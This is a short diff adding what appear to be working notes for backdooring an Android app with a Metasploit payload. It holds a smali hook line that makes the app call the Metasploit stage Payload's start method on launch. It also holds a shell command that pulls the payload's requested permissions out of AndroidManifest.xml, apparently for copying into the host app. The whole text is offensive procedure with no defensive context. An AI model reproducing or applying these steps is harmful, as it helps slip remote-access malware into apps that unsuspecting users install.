@@ -1,0 +1,6 @@
+#HOOK
+invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+
+#Get all the permissions from payload
+cat AndroidManifest.xml|grep -E "<uses-permission"
+
